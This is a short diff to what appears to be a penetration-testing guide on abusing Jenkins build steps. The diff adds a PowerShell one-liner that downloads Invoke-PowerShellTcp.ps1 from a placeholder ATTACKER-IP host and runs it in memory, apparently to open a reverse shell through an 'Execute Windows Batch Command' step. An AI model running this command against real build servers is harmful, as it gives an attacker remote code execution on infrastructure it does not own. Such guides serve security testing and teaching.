@@ -104,6 +104,11 @@ println "out> $sout err> $serr"
 - Scroll down to the option "**Build steps**" and on the drop down select/add "**Execute Windows Batch Command**" and enter-:
 
 ```
+powershell iex (iwr -UseBasicParsing http://ATTACKER-IP/Invoke-PowerShellTcp.ps1);power -R
+```
+
+
+```
 powershell -c <command>
 ```
  
